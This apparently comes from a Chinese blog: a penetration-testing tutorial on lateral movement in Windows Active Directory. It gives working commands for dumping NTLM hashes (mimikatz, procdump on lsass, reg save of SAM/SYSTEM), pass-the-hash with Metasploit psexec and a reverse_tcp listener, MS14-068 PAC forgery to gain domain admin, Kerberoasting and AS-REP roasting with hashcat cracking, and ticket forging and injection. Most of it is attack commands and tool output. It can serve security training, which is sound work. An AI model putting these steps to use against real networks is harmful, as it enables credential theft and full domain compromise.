横向移动

1.PTH

如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了
其中若hash加密方式是 rc4 ，那么就是pass the hash
若加密方式是aes key,那么就是pass the key
注意NTLM和kerberos协议均存在PTH:
NTLM自然不用多说
kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响
那前提就是要获取hash值了

1.1 HASH获取
1.使用meterpreter里的mimikatz模块
Default
meterpreter>load mimikatz
meterpreter>mimikatz_command -f mimikatz的指令
privilege::debug 提权  samdump::hashes dump哈希  
或者
meterpreter>msv/kerberos/widgst

2.使用meterpreter自带的hash获取模块
Default
meterpreter>hashdump
meterpreter>run windows/gather/smart_hashdump   (推荐使用这个)

3.向目标机上传mimikatz远程调用mimikatz.exe dump出hash，mimikatz需要免杀处理
意思就是既然我们获取到了shell，我们直接向目标机上传一个mimikatz然后在shell里使用它就行了. 使用方法为cmd窗口打开mimikatz.exe，进入mimikatz终端，然后输入mimikatz指令即可

4.上传procdump到目标机，获取到lsass.dmp文件后将其传回本地又mimikatz来dump哈希

procdump.exe是微软自带的程序，所以不会触发杀毒。所以可以通过它传回lsass.dmp本地提取hash
Default
procdump64.exe -accepteula -ma lsass.exe lsass.dmp  执行该指令，获取到lsass.dmp
然后将其传回本地
通过mimikatz.exe分别执行以下命令
"sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"
Default
Procdump：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump
mimikatz：https://github.com/gentilkiwi/mimikatz/releases

5.使用cobalt strike 获取hash
Default
beacon>hashdump
beacon>mimikatz mimikatz指令

6.利用sam表
mimikatz在线读sam表中的hash
Default
privilege::debug
token::elevate
lsadump::sam

将sam表下载到本地由mimikatz分析
Default
eg save HKLM\SYSTEM SYSTEM
reg save HKLM\SAM SAM
在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析
mimikatz运行
mimikatz # lsadump::sam /sam:SAM /system:SYSTEM
Domain : STU1
SysKey : fd4639f4e27c79683ae9fee56b44393f
Local SID : S-1-5-21-1982601180-2087634876-2293013296
 
SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17
 
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
 
RID  : 000001f5 (501)
User : Guest
 
RID  : 000003e8 (1000)
User : liukaifeng01
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

1.2 hash 传递攻击 PTH （Pass the Hash)
1.msf里使用psexec模块
Default
msf5 exploit(multi/handler) > use exploit/windows/smb/psexec  //以root启动msf
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > set lhsot 192.168.64.133
lhsot => 192.168.64.133
msf5 exploit(windows/smb/psexec) > set lhost 192.168.64.133
lhost => 192.168.64.133
msf5 exploit(windows/smb/psexec) > set lport 443
lport => 443
msf5 exploit(windows/smb/psexec) > set rhost 192.168.52.138
rhost => 192.168.52.138
msf5 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf5 exploit(windows/smb/psexec) > set SMBPass 8a963371a63944419ec1adf687bb1be5  //一般选择NTLM HASH
SMBPass => 8a963371a63944419ec1adf687bb1be5
msf5 exploit(windows/smb/psexec) > run

2.使用mimikatz
我们在目标机里放置mimikatz.exe 然后执行以下命令
Default
sekurlsa::pth /user:administrator /domain:"xxx.com" /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  //自行修改

之后便会弹出一个cmd窗口，在这个窗口里链接机器即可
Default
net use \\192.168.222.131\c$

3.使用cobalt strike
在cobalt strike里找到域控，然后使用psexec模块，选择一个本地hash即可。

2.MS14-068

这个洞的危害很大，可以让任意域用户提权到域管。
适用版本: server 2000以上
补丁: kb3011780

2.1 PAC

PAC是kerberos协议里用来解决用户权限功能所设计出的东西。
在kerberos协议里面，一个用户用自己的hash拿到了TGT，接着凭借着TGT拿到了TGS，接着用TGS去访问服务。看似只要hash正确，用户就能到处访问服务，但是所有服务都可以给这个用户所访问吗？肯定是不行的，所以微软在kerberos为了实现用户权限分级，采用了PAC。
PAC被设计为存在于TGT里面。完整的kerberos权限验证流程如下。

1。用户凭借自己的hash加密时间戳并发送明文用户名到KDC，KDC认证用户成功后返回被krbtgt用户hash加密的TGT(内有ticekt包含着PAC)，以及用户自身hash加密的login session key

2.用户凭借TGT票据向KDC发起指定服务的TGS_REQ。KDC用krbtgt hash解密，若解密成功则直接返回服务hash加密的TGS（这里并没考虑用户的权限，直接返回了TGS）

3.用户用TGS向服务发起请求，服务用自己的hash解密TGS后获得PAC，拿着PAC向KDC询问该用户是否有权限访问。KDC拿到PAC后再次解密，得到了PAC里的 用户的sid，以及所在的组，再判断用户是否有访问服务的权限（有些服务不会验证KDC，这样就会导致白银票据攻击)

PAC只不过是ticket里Authorization DATA的一个分支。

而Authorization data的结构是这样的

AuthorizationData ::= SEQUENCE OF SEQUENCE {
ad-type [0] Int32,
ad-data [1] OCTET STRING }

ad-type中就有这么一个类型 AD-IF-RELEVANT 对应数字1,由上上图可知这是PAC的外壳。
若类型为 AD-IF-RELEVAN ,那么ad-data也是一个 AuthorizationData类型的结构体，也有ad-type 和ad-data.那么这个外壳ad-data的ad-type就是次外壳AD-WIN2K-PAC 了,与 AD-WIN2K-PAC 这个ad-type对应的ad-data就是一段连续空间。这段空间包含一个头部PACTYPE以及若干个PAC_INFO_BUFFER 。
PACTYPE包含的是 cBuffers,版本以及缓冲区 。
PAC_INFO_BUFFER是key-value型的。PAC_INFO_BUFFER的key有很多

其中比较重要的是1,6和7

0x00000001 KERBVALIDATIONINFO 这个结构用于存储用户的身份信息.它是一个结构体，这个结构体是这样的(待会我们伪造PAC的时候主要就是伪造此处额 UserId 以及 PGROUP_MEMBERSHIP GroupIds ）服务器解包PAC后提取用户的sid以及groupid，然后就把当前发包过来的用户权限当成sid，groupid的权限处理。
Default
typedef struct _KERB_VALIDATION_INFO {
FILETIME LogonTime;
FILETIME LogoffTime;
FILETIME KickOffTime;
FILETIME PasswordLastSet;
FILETIME PasswordCanChange;
FILETIME PasswordMustChange;
RPC_UNICODE_STRING EffectiveName;
RPC_UNICODE_STRING FullName;
RPC_UNICODE_STRING LogonScript;
RPC_UNICODE_STRING ProfilePath;
RPC_UNICODE_STRING HomeDirectory;
RPC_UNICODE_STRING HomeDirectoryDrive;
USHORT LogonCount;
USHORT BadPasswordCount;
ULONG UserId; //用户的sid
ULONG PrimaryGroupId;
ULONG GroupCount;
[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;//用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管
ULONG UserFlags;
USER_SESSION_KEY UserSessionKey;
RPC_UNICODE_STRING LogonServer;
RPC_UNICODE_STRING LogonDomainName;
PISID LogonDomainId;
ULONG Reserved1[2];
ULONG UserAccountControl;
ULONG SubAuthStatus;
FILETIME LastSuccessfulILogon;
FILETIME LastFailedILogon;
ULONG FailedILogonCount;
ULONG Reserved3;
ULONG SidCount;
[size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;
PISID ResourceGroupDomainSid;
ULONG ResourceGroupCount;
[size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;
} KERB_VALIDATION_INFO;

0x00000006和0x00000007 6是服务器校验和，由server密码加密。7是KDC校验和，又KDC密码加密。存在的目的就是防止PAC被篡改。

2.2 MS14068

这个漏洞的产生主要是微软犯下了三个错误：
1.对校验和的算法实现不够细致，导致在校验和生成时可以不用管server和KDC的hash直接生成，而且生成出来的校验和还是合法的
2.PAC可以不用放在TGT中，即使是这样，KDC也能照常解析出TGT外的PAC
3.下面再说

那么这个漏洞大致的攻击原理是什么呢。
首先，我们在as_request的时候，把include-PAC标志设置为false，那么as_rep就不会在TGT中返回PAC了。然后这个时候我们自己伪造一个pac，在TGS_REQ时发过去就行了。伪造的pac修改USER SID&GROUP SID(在PAC的 0x00000001 KERBVALIDATIONINFO 结构)可以把我们的用户权限改到很高（域管），从而达到提权到域管的能力。

那么伪造PAC，我们就遇到了两个问题：
1.pac里有校验和，防止自己被篡改，我们得有server和KDC密码才能使校验和合法。
2.pac按理说应该在TGT里，但是TGT是被kbrtgt hash加密的，我们无法获取kbrtgt hash继而无法修改TGT内容，继而不能修改PAC。

来说说如何绕过PAC校验和问题。
我们刚刚说过，0x00000006和0x00000007 这两个结构的存在是为了防止PAC被篡改，这个校验和算法采用的是个叫checksum算法然后把kdc hash和服务hash当作key对PAC加密产生的值，从而防止PAC被篡改。但是checksum算法是有很多种的，md5也是checksum的分支之一，修改PAC后，我们只需设置加密算法为MD5并用MD5算法对0x00000001 KERBVALIDATIONINFO进行加密，将生成的值放入两个检验和即可，KDC拿到0x00000001 KERBVALIDATIONINFO，并且通过解析数据包获取当前加密算法为MD5，然后对其进行MD5加密，若加密结果与校验和一致，则认为PAC未被修改

再来说说如何绕过krbtgt hash加密TGT的问题。
因为我们在AS_REQ时设置include-PAC为false，TGT里就不会包含PAC了。那么我们在TGS_REQ时如何把PAC传递给KDC？只需要把PAC放入req-body即可。
这样KDC依旧会正常解析这个TGS_REQ包

注意TGS_REQ里的include-pac依旧是false。
然后KDC接收到PAC后会先解密TGT拿到authenticator里的key对PAC进行解密（TGS_REQ时加密PAC用的key是随机生成的，这个key会放在authenticator里），然后验证一下PAC的签名，若成功然后把解密得到的PAC采用server key和KDC key重新生成校验和，拼接成一个新的TGT返回给客户端。
上面这一段就是微软犯下的第三个错误，很不可思议，居然莫名其妙的返回了一个包含了PAC的TGT回来。总结来说就是构造了一个畸形的TGS_REQ，从TGS_RES得到了一个包含伪造PAC的TGT。

原理就是上面这些，然后我们用包含伪造PAC的TGT到处访问服务即可。

2.3 M14068利用

1.工具kekeo https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718

具体方法为，在kekeo里先执行 kerberos::purge清空票据
然后再执行 exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt
即可。

然后就dir \域控\c$ 试试，如果可以就说明提权成功了（不是每次都能成功的)

2.golenpac https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe

这个工具好用,

执行类似上述命令，就能返回一个域控的 system权限的cmd shell回来，感觉蛮好用
另外在最后指定域控机器时，可以指定域控以外的机器并获取他们的本地system权限用户.
但返回的似乎不是域控？

3.kerberoast

Kerberoast攻击原理: 攻击者从 TGS-REP 中提取加密的服务票证。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码

3.1 How to get SPN
如何得到域中的所有SPN？

1.setspn
很简单，只需执行
Default
setspn -q */*

即可

2.kerberoast工具集的GetUserSpns powershell脚本

3.2 How to get HASH

如何得到hash？
有如下方法

1.Rubeus.exe
这个工具github上就有，但是clone下来后需要自己编译成exe.
然后执行 Rubeus.exe kerberoast指令即可

2.mimikatz
mimikatz真的神器。
通过命令 kerberos::ask /target:你所指定的SPN,
即可通过认证的方式得到一个ST。
然后我们在kerberos::list里可以看到我们想要的ST

3.powershell
越来越发现powershell在域渗透中的重要性了
输入以下指令，即可完成HASH获取
Default
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MySQL/win7.xie.com:3306/MySQL"

然后mimikatz导出即可

3.3 How to export hash
获得了ST票据，但怎么导出？

1.mimikatz
导出所有票据
可以发现生成了kirbi文件。这就是我们所需要的hash了

2.Empire Powershell 框架
github:https://github.com/EmpireProject/Empire
我们通过这个框架可以导出hashcat格式的hash.
Default
Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat

3.4 How to crack HASH
如何破解HASH?

1.HASHCAT
这个工具需要让hash格式为hashcat模式才能进行破解。kribi文件不能放入hashcat进行破解.
Default
hashcat -m 13110 pass.txt hash.txt

2.kerberoast中的tgsrepcrack.py
支持kribi文件破解
Default
python3 tgsrepcrack.py pass.txt xxx.kribi

3.5 How to use Kerberoast
既然我们都把ST的加密hash都破解了，那么我们就可以随便改ST中的票据内容了..\ 这里使用的是kerberoast工具集里的kerberoast.py
Default
python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500
python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512
## 将票据权限改为administrator
kerberos::ptt PENTESTLAB.kirbi  #将票据注入到内存

4.AS_REP Roast
较Kerberoast来说，比较鸡肋。
它的原理是在不开启kerberos预身份验证的前提下，获得其他用户的AS_RES，并破解加密session key 的 client hash。

4.1 How to get HASH
1.Rubeus
Default
Rubeus.exe asreproast

然后就会搜索域中不需要kerberos预验证的用户，并获得ASREP。

2.Empire框架与 ASREPRoast.ps1
使用Empire框架下的powerview.ps1查找域中设置了 “不需要kerberos预身份验证” 的用户
Default
Import-Module .\powerview.ps1
 Get-DomainUser -PreauthNotRequired

然后用 ASREPRoast.ps1 ：https://github.com/HarmJ0y/ASREPRoast 获取指定用户的AS-REPhash
Default
Import-Module ASREPRoast.ps1
Get-ASREPHash -USER xx -Domain xx |Out-file -Encoding ASCII hash.txt

就会生成一个hash数据文件了

4.2 How to crack hash
将生成的HASH保存起来，并在下图处加入$23
然后丢给hashcat 跑
Default
hashcat -m 18200 hash.txt pass.txt

注意这里的pass.txt是自己的明文字典…之前我还一直以为是爆破出来的结果.
原来是一个一个的用明文字典去爆破。

5.委派攻击
参考
Default
https://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247490632&idx=1&sn=27710f7b08cd78daf420735ed9c1fe92&scene=21#wechat_redirect
